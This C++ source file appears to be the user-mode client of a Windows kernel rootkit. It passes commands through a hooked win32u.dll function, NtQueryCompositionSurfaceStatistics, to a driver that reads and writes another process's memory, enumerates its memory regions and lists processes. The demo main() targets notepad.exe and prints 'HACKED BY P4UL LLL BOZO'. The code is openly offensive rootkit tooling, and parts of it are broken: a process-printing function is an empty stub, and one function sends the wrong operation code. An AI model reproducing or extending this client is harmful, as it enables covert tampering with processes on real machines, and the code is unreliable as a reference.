#include <iostream>
#include <Windows.h>
#include <windef.h>
#include <TlHelp32.h>
#include <memory>
#include <string_view>
#include <cstdint>
#include <vector>
#include <stdio.h>
#include <ntstatus.h>
#include "structs.h"


// communicate with the KM driver (through the hooking mechanism) -
template<typename ... Arg>
uint64_t CallHook(const Arg ... args) {
	printf("Loading user32.dll ..\n");
	LoadLibrary("user32.dll");

	printf("Creating a pointer to the NtQueryCompositionSurfaceStatistics function..\n");
	void* HookToFunc = GetProcAddress(LoadLibrary("win32u.dll"), "NtQueryCompositionSurfaceStatistics");  // get memory address of the hookto function
	if (HookToFunc == NULL) {
		printf("Could not get a pointer to NtQueryCompositionSurfaceStatistics from win32u.dll, stopping the calling..\n");
		return NULL;
	}

	printf("Creating a function variable to use it for calling NtQueryCompositionSurfaceStatistics..\n");
	auto Function = static_cast<uint64_t(_stdcall*)(Arg...)>(HookToFunc);  // export the function so i can call it
	
	printf("Calling the function variable with the supplier argument/s..\n");
	uint64_t FuncRet = Function(args ...);

	printf("Function had worked and return value/s were received, wait for processing..\n");
	return FuncRet;
}


/*
(CURRENT) options available for hooking parameters for different operations:
*/


// Get module base address by name - 
static ULONG64 GetModuleBaseAddress(const char* ModuleName) {
	ROOTKIT_MEMORY RootkInstructions = { 0 };
	std::uint32_t PrcID = GetPID(ModuleName);

	printf("\n=====GetModuleBaseAddress=====\n");
	if (PrcID == NULL) {
		printf("Calling GetModuleBaseAddress() did not work - invalid ModuleName, stopping the calling..\n");
		printf("==============================\n\n");
		return NULL;
	}
	printf("PID:%u\n", PrcID);
	RootkInstructions.PID = PrcID;
	RootkInstructions.Operation = RKOP_MDLBASE;
	RootkInstructions.MdlName = ModuleName;
	CallHook(&RootkInstructions);  // pass instructions to hooking function (KM driver function)
	PrintStatusCode(RootkInstructions.StatusCode);

	if (!RootkInstructions.BaseAddr || RootkInstructions.Status == STATUS_UNSUCCESSFUL) {
		printf("RESPONSE: Could not get the address of notepad.exe :(\n");
	}
	else {
		printf("RESPONSE: %s address base: %lu :)\n", ModuleName, static_cast<unsigned long>(RootkInstructions.BaseAddr));
	}
	printf("==============================\n\n");

	return RootkInstructions.BaseAddr;  // get module base address
}


// Display messagebox from kernel mode - 
static void DisplayStringFromKMD(const char* Message) {
	ROOTKIT_MEMORY RootkInstructions = { 0 };
	std::uint32_t PrcID = GetCurrentProcessId();
	RootkInstructions.PID = PrcID;
	RootkInstructions.Operation = RKOP_DSPSTR;
	RootkInstructions.Buffer = const_cast<void*>(static_cast<const void*>(Message));

	printf("\n=====DisplayStringFromKMD=====\n");
	printf("PID:%u\n", PrcID);
	CallHook(&RootkInstructions);  // pass instructions to hooking function (KM driver function)
	PrintStatusCode(RootkInstructions.StatusCode);
	printf("LOG: Printed to WinDbg the next string: %s :)\n", Message);
	printf("==============================\n\n");
}


// Read from kernel memory - 
template <class T>
T ReadFromRootkKMD(UINT_PTR ReadAddress, const char* SrcMdlName, const char* DstMdlName) {
	ROOTKIT_MEMORY RootkInstructions;
	T Response;
	std::uint32_t SrcPID;
	std::uint32_t DstPID;
	const char* MagicMdl = "mymyymym";
	printf("\n=====ReadFromRootkKMD=====\n");

	// configure source pid -
	if (strcmp(SrcMdlName, MagicMdl) == 0) {
		SrcPID = GetCurrentProcessId();
	}
	else {
		SrcPID = GetPID(SrcMdlName);
	}

	// configure destination pid -
	if (strcmp(DstMdlName, MagicMdl) == 0) {
		DstPID = GetCurrentProcessId();
	}
	else {
		DstPID = GetPID(DstMdlName);
	}

	if (SrcPID == NULL) {
		printf("Calling ReadFromRootkKMD() did not work - invalid PID of read source (NULL)..\n");
		printf("==========================\n\n");
		return NULL;
	}
	if (DstPID == NULL) {
		printf("Calling ReadFromRootkKMD() did not work - invalid PID of read destination (NULL)..\n");
		printf("==========================\n\n");
		return NULL;
	}
	printf("SrcPID:%u\n", SrcPID);
	printf("DstPID:%u\n", DstPID);
	RootkInstructions.PID = SrcPID;
	RootkInstructions.ReadToPID = DstPID;
	RootkInstructions.Size = sizeof(T);
	RootkInstructions.Address = ReadAddress;
	RootkInstructions.Operation = RKOP_READ;
	RootkInstructions.Out = &Response;
	CallHook(&RootkInstructions);
	PrintStatusCode(RootkInstructions.StatusCode);

	if (RootkInstructions.Status == STATUS_UNSUCCESSFUL) {
		printf("RESPONSE: Read operation from address 0x%llx did not succeed :(\n", ReadAddress);
		printf("==========================\n\n");
		return NULL;
	}

	printf("RESPONSE: Value read from address 0x%llx: %lu :)\n", ReadAddress, Response);
	printf("==========================\n\n");
	return Response;
}


// Write into kernel memory - 
bool WriteToRootkKMD(UINT_PTR  WriteAddress, UINT_PTR SrcAddress, SIZE_T WriteSize, const char* ModuleName) {
	ROOTKIT_MEMORY RootkInstructions;
	std::uint32_t PrcID;
	const char* MagicMdl = "mymyymym";
	if (strcmp(ModuleName, MagicMdl) == 0) {
		PrcID = GetCurrentProcessId();
	}
	else {
		PrcID = GetPID(ModuleName);
	}
	printf("\n=====WriteToRootkKMD=====\n");
	if (PrcID == NULL) {
		printf("Calling WriteToRootkKMD() did not work - invalid PID (NULL)..\n");
		printf("=========================\n\n");
		return FALSE;
	}
	printf("PID:%u\n", PrcID);
	RootkInstructions.PID = PrcID;
	RootkInstructions.Size = WriteSize;
	RootkInstructions.Operation = RKOP_WRITE;
	RootkInstructions.Address = WriteAddress;  // Address = virtual address in PrcID (WRITE INTO)
	RootkInstructions.Buffer = (void*)SrcAddress;

	CallHook(&RootkInstructions);
	PrintStatusCode(RootkInstructions.StatusCode);
	if (RootkInstructions.Status == STATUS_UNSUCCESSFUL) {
		printf("LOG: Writing into address 0x%llx did not work :(\n", WriteAddress);
		printf("=========================\n\n");
		return FALSE;
	}

	printf("LOG: Writing into address 0x%llx concluded, now reading from the same address :)\n", WriteAddress);
	printf("=========================\n\n");
	return TRUE;
}


// Get status of all memory regions - 
static RKMEMORY_BASIC_INFORMATION GetAllStatsOfPrc(const char* ModuleName) {
	ROOTKIT_MEMORY RootkInstructions = { 0 };
	std::uint32_t PrcID;
	const char* MagicMdl = "mymyymym";
	if (strcmp(ModuleName, MagicMdl) == 0) {
		PrcID = GetCurrentProcessId();
	}
	else {
		PrcID = GetPID(ModuleName);
	}

	RootkInstructions.PID = PrcID;
	RootkInstructions.Operation = RKOP_ALLSTATS;

	printf("\n=====GetAllStatsOfPrc=====\n");
	printf("PID:%u\n", PrcID);
	CallHook(&RootkInstructions);  // pass instructions to hooking function (KM driver function)
	PrintStatusCode(RootkInstructions.StatusCode);
	
	if (RootkInstructions.Status == STATUS_UNSUCCESSFUL) {
		printf("RESPONSE: Could not get information about any memory region :(\n");
		printf("=========================\n\n");
		return { NULL, NULL, NULL, NULL, NULL, NULL, NULL };
	}

	RKMEMORY_BASIC_INFORMATION RgnInfo = RootkInstructions.RlvRegions;
	printf("RESPONSE: Got information about atleast 1 memory region :)\n");
	PrintAllRegionStats(RgnInfo);
	printf("\n=========================\n");
	return RgnInfo;
}


// Get status of a specific memory region - 
static RKMEMORY_BASIC_INFORMATION GetOneStatOfPrc(PULONG64 Address, const char* ModuleName) {
	ROOTKIT_MEMORY RootkInstructions = { 0 };
	std::uint32_t PrcID;
	const char* MagicMdl = "mymyymym";
	if (strcmp(ModuleName, MagicMdl) == 0) {
		PrcID = GetCurrentProcessId();
	}
	else {
		PrcID = GetPID(ModuleName);
	}

	RootkInstructions.PID = PrcID;
	RootkInstructions.Operation = RKOP_DSPSTR;
	RootkInstructions.Address = (UINT_PTR)Address;

	printf("\n=====GetOneStatOfPrc=====\n");
	printf("PID:%u\n", PrcID);
	CallHook(&RootkInstructions);  // pass instructions to hooking function (KM driver function)
	PrintStatusCode(RootkInstructions.StatusCode);

	if (RootkInstructions.Status == STATUS_UNSUCCESSFUL) {
		printf("RESPONSE: Could not get information about any memory region :(\n");
		printf("=========================\n\n");
		return { NULL, NULL, NULL, NULL, NULL, NULL, NULL };
	}

	RKMEMORY_BASIC_INFORMATION RgnInfo = RootkInstructions.RlvRegions;
	printf("RESPONSE: Got information about the memory region :)\n");
	PrintAllRegionStats(RgnInfo);
	printf("=========================\n\n");
	return RgnInfo;
}


// List all working processes - 
static void ListAllWorkingProcesses() {
	ROOTKIT_MEMORY RootkInstructions = { 0 };
	std::uint32_t PrcID = GetCurrentProcessId();
	RootkInstructions.PID = PrcID;
	RootkInstructions.Operation = RKOP_PSLIST;

	printf("\n=====ListAllWorkingProcesses=====\n");
	printf("PID:%u\n", PrcID);
	CallHook(&RootkInstructions);  // pass instructions to hooking function (KM driver function)
	PrintStatusCode(RootkInstructions.StatusCode);

	if (RootkInstructions.Status == STATUS_UNSUCCESSFUL) {
		printf("RESPONSE: Could not get information about any working processes :(\n");
	}

	else {
		printf("RESPONSE: Got information about working processes :)\n");
		PrintAllWorkingProcesses();
	}
	printf("=================================\n\n");
}


// Print all working processes on target -
static void PrintAllWorkingProcesses() {

}


int main() {
	LPCSTR Module = "notepad.exe";
	ULONG64 Address = 0x0000000000100000;  // CHANGE BY COMMITED AREAS

	uintptr_t NpBaseAddress = GetModuleBaseAddress(Module);  // get address of notepad.exe in memory

	DisplayStringFromKMD("HACKED BY P4UL LLL BOZO");  // write const char* string to windbg

	GetAllStatsOfPrc("mymyymym");
	GetAllStatsOfPrc(Module);

	GetOneStatOfPrc(&Address, "mymyymym");
	GetOneStatOfPrc(&Address, Module);
	GetOneStatOfPrc(nullptr, "mymyymym");  // gets the first available region
	GetOneStatOfPrc(nullptr, Module);  // gets the first available region

	ULONG WriteVal = 505050;
	WriteToRootkKMD(Address, (UINT_PTR)&WriteVal, sizeof(ULONG), Module);  // write ULONG value to notepad.exe's memory

	ULONG DataRead = ReadFromRootkKMD<ULONG>(Address, Module, "mymyymym");  // read ULONG value from notepad.exe's memory

	// PrintAllWorkingProcesses();
}
